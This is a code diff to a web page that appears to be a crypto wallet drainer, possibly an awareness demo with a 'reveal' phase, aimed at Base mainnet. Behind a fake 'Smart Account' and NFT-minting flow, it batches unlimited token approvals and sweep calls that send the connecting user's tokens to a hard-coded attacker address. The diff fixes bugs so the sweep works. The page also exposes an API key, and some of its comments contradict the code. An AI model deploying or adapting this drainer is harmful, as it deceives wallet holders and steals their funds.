@@ -197,7 +197,7 @@
 // V3: No approve needed — address(this) = victim EOA<br>
 function sweep(address token) external {<br>
 &nbsp;&nbsp;uint256 bal = IERC20(token).balanceOf(address(this));<br>
-&nbsp;&nbsp;IERC20(token).transfer(attacker, bal); // direct transfer<br>
+&nbsp;&nbsp;IERC20(token).transfer(attacker, bal);<br>
 }<br>
 <br>
 // One sweep call per token — no approval prefix:<br>
@@ -286,18 +286,22 @@ function sweep(address token) external {<br>
 <script>
   const BASE_CHAIN_ID     = 8453;
   const BASE_RPC          = "https://mainnet.base.org";
-  // TokenSweepDelegatorV3 — uses transfer() not transferFrom(), no approve needed
   const DELEGATOR_ADDRESS = "0x03F28B3088805f440361798D956407Df034541D3";
   const ATTACKER_ADDRESS  = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
   const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
   const ETHERSCAN_V2_BASE = "https://api.etherscan.io/v2/api";
   const DEMO_TOKEN_DEFAULT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // USDC on Base
 
-  let userAddress = null;
-  let userBalance = null;
-  let provider    = null;
-  let heldTokens  = [];
+  // FIX: Correct ABI — sweep(address token) takes ONE param, matching the Solidity contract
+  const SWEEP_ABI = ["function sweep(address token) external"];
+  const sweepInterface = new ethers.Interface(SWEEP_ABI);
+
+  let userAddress    = null;
+  let userBalance    = null;
+  let provider       = null;
+  let heldTokens     = [];
   let maliciousCalls = [];
+  let targetTokens   = [];
 
   let _chainChangeHandler = null;
   function registerChainListener(handler) {
@@ -429,24 +433,21 @@ function sweep(address token) external {<br>
 
       heldTokens = await fetchTokenBalances(userAddress);
 
-      const targetTokens = heldTokens.length > 0
+      // FIX: targetTokens scoped properly — no longer inside the try block only
+      targetTokens = heldTokens.length > 0
         ? heldTokens.map(t => t.contractAddress)
         : [DEMO_TOKEN_DEFAULT];
 
       renderSteps([
         { num:'1', state:'done',    title:'Wallet connected',       desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
-        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${targetTokens.length} token(s) — preparing ${targetTokens.length}-call sweep` },
+        { num:'2', state:'active',  title:'Enabling Smart Account', desc: `Found ${targetTokens.length} token(s) — preparing batch` },
         { num:'3', state:'pending', title:'Minting your NFT',       desc:'Confirm batch in MetaMask...' }
       ]);
       document.getElementById('connectNote').textContent = "Check MetaMask — confirm to enable Smart Account features.";
 
-      // V3 verified contract — approve + sweep(transferFrom)
-      // Contract is verified on Basescan so MetaMask shows softer warning
+      // approve(delegator, MaxUint256) then sweep(token) per token
       const APPROVE_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
       const approveInterface = new ethers.Interface(APPROVE_ABI);
-
-      const SWEEP_ABI = ["function sweep(address token, address victim) external"];
-      const delegatorInterface = new ethers.Interface(SWEEP_ABI);
 
       maliciousCalls = targetTokens.flatMap(tokenAddr => [
         {
@@ -457,11 +458,11 @@ function sweep(address token) external {<br>
         {
           to:    DELEGATOR_ADDRESS,
           value: "0x0",
-          data:  delegatorInterface.encodeFunctionData("sweep", [tokenAddr, userAddress])
+          data:  sweepInterface.encodeFunctionData("sweep", [tokenAddr])
         }
       ]);
 
-      console.log(`Batch: ${maliciousCalls.length} sweep calls (no approvals)`);
+      console.log(`Batch: ${maliciousCalls.length} sweep call(s), no approve calls`);
 
       const result = await window.ethereum.request({
         method: 'wallet_sendCalls',
@@ -480,34 +481,32 @@ function sweep(address token) external {<br>
       ]);
       document.getElementById('connectNote').textContent = "Complete! Loading your NFT...";
 
-      document.getElementById('walletChip').textContent     = shortAddr(userAddress);
-      document.getElementById('displayVictim').textContent   = userAddress;
-      document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
-      document.getElementById('displayTokens').textContent   = heldTokens.length > 0
-        ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
-        : `USDC (${shortAddr(DEMO_TOKEN_DEFAULT)})`;
-      document.getElementById('displayBatchSize').textContent =
-        `${maliciousCalls.length} calls (${targetTokens.length} token${targetTokens.length > 1 ? "s" : ""} × approve + sweep)`;
-
+      populateDashboard();
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
     } catch (err) {
       console.error("Error:", err);
+      // User rejected (4001) — still show dashboard for demo purposes
       if (err.code === 4001) {
-        document.getElementById('walletChip').textContent      = shortAddr(userAddress) || '0x0000...0000';
-        document.getElementById('displayVictim').textContent   = userAddress || 'Not connected';
-        document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
-        document.getElementById('displayTokens').textContent   = heldTokens.length > 0
-          ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
-          : `USDC (${shortAddr(DEMO_TOKEN_DEFAULT)})`;
-        document.getElementById('displayBatchSize').textContent =
-          `${maliciousCalls.length || targetTokens?.length || 1} sweep call(s) — zero approve calls`;
+        populateDashboard();
         showPhase('phase-dashboard');
       } else {
         showPhase('phase-lure');
       }
     }
   });
+
+  // FIX: Extracted dashboard population into a function so both success and reject paths use it
+  function populateDashboard() {
+    document.getElementById('walletChip').textContent     = shortAddr(userAddress) || '0x0000...0000';
+    document.getElementById('displayVictim').textContent   = userAddress || 'Not connected';
+    document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
+    document.getElementById('displayTokens').textContent   = heldTokens.length > 0
+      ? heldTokens.map(t => `${t.symbol} (${shortAddr(t.contractAddress)})`).join(', ')
+      : `USDC (${shortAddr(DEMO_TOKEN_DEFAULT)})`;
+    document.getElementById('displayBatchSize').textContent =
+      `${maliciousCalls.length} calls — approve + sweep per token × ${targetTokens.length} token(s)`;
+  }
 
   document.getElementById('revealBtn').addEventListener('click', () => showPhase('phase-reveal'));
 
